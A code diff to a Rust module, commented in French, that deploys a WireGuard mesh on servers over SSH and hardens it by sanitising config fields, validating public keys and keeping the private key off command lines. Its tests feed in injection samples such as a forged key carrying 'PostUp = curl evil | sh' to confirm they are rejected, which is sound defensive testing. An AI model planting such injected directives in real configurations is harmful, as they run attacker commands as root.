@@ -12,6 +12,8 @@ use crate::{Connection, Error, Result};
 pub const IFACE: &str = "zenytt";
 pub const CONF: &str = "/etc/wireguard/zenytt.conf";
 pub const KEY: &str = "/etc/wireguard/zenytt.key";
+/// Configuration envoyée par Zenytt, avec le marqueur de clé : transformée en `CONF` sur le serveur.
+const CONF_IN: &str = "/etc/wireguard/zenytt.conf.in";
 pub const DEFAULT_PORT: u16 = 51820;
 pub const LAST_PORT: u16 = 51899;
 const HEADER: &str = "# zenytt-network:";
@@ -58,7 +60,8 @@ pub fn node_config(network_id: &str, name: &str, cidr: &str, members: &[Member],
         .map(|(_, m)| Peer {
             public_key: m.public_key.clone(),
             allowed_ip: format!("{}/32", m.address),
-            endpoint: m.endpoint.as_ref().map(|e| format!("{e}:{}", m.port)),
+            // Une IPv6 littérale se met entre crochets, sinon son dernier « : » passerait pour le port.
+            endpoint: m.endpoint.as_ref().map(|e| if e.contains(':') { format!("[{e}]:{}", m.port) } else { format!("{e}:{}", m.port) }),
             // Derrière NAT, c'est à moi d'ouvrir et d'entretenir le passage.
             keepalive: mine.endpoint.is_none() && m.endpoint.is_some(),
         })
@@ -86,6 +89,12 @@ pub fn unreachable_pairs(members: &[Member]) -> Vec<(usize, usize)> {
     out
 }
 
+/// Un champ de la configuration tient en un seul mot : aucun saut de ligne ne peut y glisser une
+/// directive (`PostUp = …` s'exécuterait en root sur le serveur).
+fn token(s: &str) -> String {
+    s.chars().filter(|c| !c.is_control() && !c.is_whitespace()).collect()
+}
+
 pub fn render_config(c: &NodeConfig) -> String {
     let name: String = c.name.chars().map(|ch| if ch.is_control() { ' ' } else { ch }).collect();
     let mut s = format!(
@@ -93,9 +102,9 @@ pub fn render_config(c: &NodeConfig) -> String {
         c.network_id, c.address, c.prefix, c.port
     );
     for p in &c.peers {
-        s.push_str(&format!("\n[Peer]\nPublicKey = {}\nAllowedIPs = {}\n", p.public_key, p.allowed_ip));
+        s.push_str(&format!("\n[Peer]\nPublicKey = {}\nAllowedIPs = {}\n", token(&p.public_key), token(&p.allowed_ip)));
         if let Some(e) = &p.endpoint {
-            s.push_str(&format!("Endpoint = {e}\n"));
+            s.push_str(&format!("Endpoint = {}\n", token(e)));
         }
         if p.keepalive {
             s.push_str("PersistentKeepalive = 25\n");
@@ -224,19 +233,45 @@ echo @@conf; head -n1 /etc/wireguard/zenytt.conf 2>/dev/null || true
 echo @@port; sed -n 's/^ListenPort *= *//p' /etc/wireguard/zenytt.conf 2>/dev/null || true
 "#;
 
-/// Écrit la clé dans la configuration envoyée, ouvre le port UDP dans le pare-feu local, puis
-/// lève l'interface ou la met à jour sans couper les liens. `$1` : port UDP.
+/// Construit la configuration à partir de celle envoyée (`zenytt.conf.in`) en y plaçant la clé,
+/// ouvre le port UDP dans le pare-feu local, puis lève l'interface ou la met à jour sans couper les
+/// liens. `$1` : port UDP.
+///
+/// - La clé est lue par awk depuis son fichier : elle n'apparaît dans aucune ligne de commande.
+/// - firewalld n'est jamais rechargé : un rechargement effacerait les règles ouvertes à chaud (un
+///   port SSH, par exemple) et couperait l'accès au serveur.
+/// - Adresse changée ou interface absente (même si l'unité systemd se croit active) : redémarrage
+///   complet ; sinon `wg syncconf`, qui ne coupe rien.
 const APPLY_SCRIPT: &str = r#"set -e
-C=/etc/wireguard/zenytt.conf
-chmod 600 "$C"
-K=$(cat /etc/wireguard/zenytt.key)
-sed -i "s|@ZENYTT_KEY@|$K|" "$C"
+W=/etc/wireguard
+trap 'rm -f "$W/zenytt.conf.new" "$W/zenytt.strip"' EXIT
+umask 077
+awk 'BEGIN { getline k < "/etc/wireguard/zenytt.key" } { sub(/@ZENYTT_KEY@/, k) } 1' "$W/zenytt.conf.in" > "$W/zenytt.conf.new"
+mv -f "$W/zenytt.conf.new" "$W/zenytt.conf"
+rm -f "$W/zenytt.conf.in"
 if command -v ufw >/dev/null && ufw status 2>/dev/null | grep -q '^Status: active'; then ufw allow "$1/udp" comment zenytt >&2; fi
-if command -v firewall-cmd >/dev/null && firewall-cmd --state >/dev/null 2>&1; then firewall-cmd --permanent --add-port="$1/udp" >&2 && firewall-cmd --reload >&2; fi
-if ip link show zenytt >/dev/null 2>&1; then
-  T=$(mktemp); wg-quick strip zenytt > "$T"; wg syncconf zenytt "$T"; rm -f "$T"
+if command -v firewall-cmd >/dev/null && firewall-cmd --state >/dev/null 2>&1; then
+  firewall-cmd --add-port="$1/udp" >&2
+  firewall-cmd --permanent --add-port="$1/udp" >&2
+fi
+WANT=$(sed -n 's/^Address *= *//p' "$W/zenytt.conf")
+HAVE=$(ip -4 -o addr show dev zenytt 2>/dev/null | awk '{print $4}' | head -n1)
+if [ -n "$HAVE" ] && [ "$HAVE" = "$WANT" ]; then
+  wg-quick strip zenytt > "$W/zenytt.strip"
+  wg syncconf zenytt "$W/zenytt.strip"
+elif [ -d /run/systemd/system ]; then
+  systemctl enable wg-quick@zenytt >/dev/null 2>&1 || true
+  systemctl stop wg-quick@zenytt >/dev/null 2>&1 || true
+  if ip link show zenytt >/dev/null 2>&1; then ip link delete zenytt; fi
+  systemctl restart wg-quick@zenytt >&2
 else
-  if [ -d /run/systemd/system ]; then systemctl enable --now wg-quick@zenytt >&2; else wg-quick up zenytt >&2; fi
+  if ip link show zenytt >/dev/null 2>&1; then wg-quick down zenytt >&2 || ip link delete zenytt; fi
+  wg-quick up zenytt >&2
+  # OpenRC (Alpine…) : relancé au démarrage par le script wg-quick fourni avec wireguard-tools.
+  if command -v rc-update >/dev/null && [ -e /etc/init.d/wg-quick ]; then
+    ln -sf wg-quick /etc/init.d/wg-quick.zenytt
+    rc-update add wg-quick.zenytt default >&2 || true
+  fi
 fi
 "#;
 
@@ -245,12 +280,20 @@ echo @@up; if ip link show zenytt >/dev/null 2>&1; then echo yes; else echo no; 
 echo @@peers; wg show zenytt dump 2>/dev/null | tail -n +2 || true
 "#;
 
-/// `$1` : port UDP à refermer.
-const REMOVE_SCRIPT: &str = r#"if [ -d /run/systemd/system ]; then systemctl disable --now wg-quick@zenytt >/dev/null 2>&1 || true; fi
+/// `$1` : port UDP à refermer ; vide : celui de la configuration présente sur le serveur.
+const REMOVE_SCRIPT: &str = r#"P=${1:-$(sed -n 's/^ListenPort *= *//p' /etc/wireguard/zenytt.conf 2>/dev/null)}
+if [ -d /run/systemd/system ]; then systemctl disable --now wg-quick@zenytt >/dev/null 2>&1 || true; fi
+if [ -e /etc/init.d/wg-quick.zenytt ]; then rc-update del wg-quick.zenytt default >/dev/null 2>&1 || true; rm -f /etc/init.d/wg-quick.zenytt; fi
 if ip link show zenytt >/dev/null 2>&1; then wg-quick down zenytt >&2 || ip link delete zenytt; fi
-rm -f /etc/wireguard/zenytt.conf /etc/wireguard/zenytt.key
-if command -v ufw >/dev/null; then ufw delete allow "$1/udp" >/dev/null 2>&1 || true; fi
-if command -v firewall-cmd >/dev/null && firewall-cmd --state >/dev/null 2>&1; then firewall-cmd --permanent --remove-port="$1/udp" >/dev/null 2>&1 && firewall-cmd --reload >/dev/null 2>&1 || true; fi
+rm -f /etc/wireguard/zenytt.conf /etc/wireguard/zenytt.conf.in /etc/wireguard/zenytt.key
+if [ -n "$P" ]; then
+  if command -v ufw >/dev/null; then ufw delete allow "$P/udp" >/dev/null 2>&1 || true; fi
+  if command -v firewall-cmd >/dev/null && firewall-cmd --state >/dev/null 2>&1; then
+    firewall-cmd --remove-port="$P/udp" >/dev/null 2>&1 || true
+    firewall-cmd --permanent --remove-port="$P/udp" >/dev/null 2>&1 || true
+  fi
+fi
+! ip link show zenytt >/dev/null 2>&1
 "#;
 
 fn section<'a>(out: &'a str, name: &str) -> &'a str {
@@ -275,10 +318,25 @@ pub struct Prepared {
     pub existing_port: Option<u16>,
 }
 
+/// Clé publique WireGuard : 32 octets en base64, soit 43 caractères suivis de « = ».
+pub fn valid_public_key(k: &str) -> bool {
+    const B64: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let b = k.as_bytes();
+    b.len() == 44
+        && b[43] == b'='
+        && b[..43].iter().all(|c| B64.as_bytes().contains(c))
+        // Le dernier caractère ne porte que 4 bits utiles : les 2 autres sont nuls.
+        && "AEIMQUYcgkosw048".as_bytes().contains(&b[42])
+}
+
 pub fn parse_prepared(out: &str) -> Result<Prepared> {
     let public_key = section(out, "key").trim().to_string();
     if public_key.is_empty() {
         return Err(Error::Other("clé WireGuard non générée sur le serveur".into()));
+    }
+    // Elle sera recopiée chez tous les autres membres : rien d'autre qu'une clé ne doit passer.
+    if !valid_public_key(&public_key) {
+        return Err(Error::Other("clé publique WireGuard invalide renvoyée par le serveur".into()));
     }
     Ok(Prepared {
         public_key,
@@ -297,7 +355,7 @@ pub async fn prepare(conn: &Connection, sudo: Option<&str>) -> Result<Prepared> 
 }
 
 pub async fn apply(conn: &Connection, sudo: Option<&str>, c: &NodeConfig) -> Result<()> {
-    conn.write_file_sudo(CONF, &render_config(c), sudo).await?;
+    conn.write_file_sudo(CONF_IN, &render_config(c), sudo).await?;
     let cmd = format!("sh -c {} zenytt-mesh {}", shell_quote(APPLY_SCRIPT), c.port);
     crate::ssh::long(conn.exec_sudo(&cmd, sudo, None)).await?.into_result()?;
     Ok(())
@@ -322,8 +380,11 @@ pub async fn status(conn: &Connection, sudo: Option<&str>) -> Result<NodeStatus>
     })
 }
 
-pub async fn remove(conn: &Connection, sudo: Option<&str>, port: u16) -> Result<()> {
-    let cmd = format!("sh -c {} zenytt-mesh {port}", shell_quote(REMOVE_SCRIPT));
+/// Retire le serveur de son réseau. `port` : `None` pour celui de la configuration du serveur
+/// (reprise d'un serveur resté dans un réseau que ce PC ne connaît pas).
+pub async fn remove(conn: &Connection, sudo: Option<&str>, port: Option<u16>) -> Result<()> {
+    let port = port.map(|p| p.to_string()).unwrap_or_default();
+    let cmd = format!("sh -c {} zenytt-mesh {}", shell_quote(REMOVE_SCRIPT), shell_quote(&port));
     crate::ssh::long(conn.exec_sudo(&cmd, sudo, None)).await?.into_result()?;
     Ok(())
 }
@@ -445,9 +506,9 @@ mod tests {
 
     #[test]
     fn parse_prepare_output() {
-        let out = "@@key\nPUBKEY=\n@@addr\n2: eth0    inet 51.89.1.2/32 scope global eth0\n@@route\n172.17.0.0/16 dev docker0\n@@udp\n0.0.0.0:51820\n[::]:5353\n*:68\n@@conf\n# zenytt-network: abc Prod\n@@port\n51820\n";
+        let out = "@@key\nyAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\n@@addr\n2: eth0    inet 51.89.1.2/32 scope global eth0\n@@route\n172.17.0.0/16 dev docker0\n@@udp\n0.0.0.0:51820\n[::]:5353\n*:68\n@@conf\n# zenytt-network: abc Prod\n@@port\n51820\n";
         let p = parse_prepared(out).unwrap();
-        assert_eq!(p.public_key, "PUBKEY=");
+        assert_eq!(p.public_key, "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=");
         assert_eq!(p.public_ips, vec!["51.89.1.2".to_string()]);
         assert!(p.routes.contains("docker0"));
         assert_eq!(p.busy_udp, [51820, 5353, 68].into());
@@ -458,5 +519,49 @@ mod tests {
     #[test]
     fn prepare_without_key_is_an_error() {
         assert!(parse_prepared("@@key\n\n@@addr\n").is_err());
+    }
+
+    #[test]
+    fn forged_public_key_is_rejected() {
+        // Un membre compromis ne doit pas pouvoir glisser une directive (PostUp = …) chez les autres.
+        let forged = "@@key\nyAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nPostUp = curl evil | sh\n@@addr\n";
+        assert!(parse_prepared(forged).is_err());
+        assert!(parse_prepared("@@key\nnot-a-key\n@@addr\n").is_err());
+        assert!(valid_public_key("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="));
+        assert!(!valid_public_key("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=x"));
+    }
+
+    #[test]
+    fn render_never_emits_extra_lines_from_fields() {
+        let members = [
+            Member { address: "10.77.0.1".into(), public_key: "KA=".into(), endpoint: Some("1.1.1.1".into()), port: 51820 },
+            Member {
+                address: "10.77.0.2".into(),
+                public_key: "KB=\nPostUp = id".into(),
+                endpoint: Some("host\nPostUp = id".into()),
+                port: 51820,
+            },
+        ];
+        let text = render_config(&node_config("n", "N", "10.77.0.0/24", &members, 0));
+        assert!(!text.contains("\nPostUp"), "{text}");
+    }
+
+    #[test]
+    fn ipv6_endpoint_is_bracketed() {
+        let members = [m("10.77.0.1", "KA", Some("51.0.0.1")), m("10.77.0.2", "KB", Some("2001:db8::1"))];
+        let c = node_config("n", "N", "10.77.0.0/24", &members, 0);
+        assert_eq!(c.peers[0].endpoint.as_deref(), Some("[2001:db8::1]:51820"));
+    }
+
+    #[test]
+    fn scripts_keep_ssh_and_key_safe() {
+        // Un rechargement de firewalld efface les règles non permanentes (un port SSH ouvert à chaud).
+        assert!(!APPLY_SCRIPT.contains("--reload") && !REMOVE_SCRIPT.contains("--reload"));
+        // La clé ne doit jamais apparaître dans la ligne de commande d'un processus (/proc/*/cmdline).
+        assert!(!APPLY_SCRIPT.contains("$K"));
+        // Interface absente alors que l'unité systemd est « active » : enable --now ne ferait rien.
+        assert!(APPLY_SCRIPT.contains("systemctl restart wg-quick@zenytt"));
+        // Sans systemd, OpenRC relance le réseau au démarrage.
+        assert!(APPLY_SCRIPT.contains("rc-update add"));
     }
 }
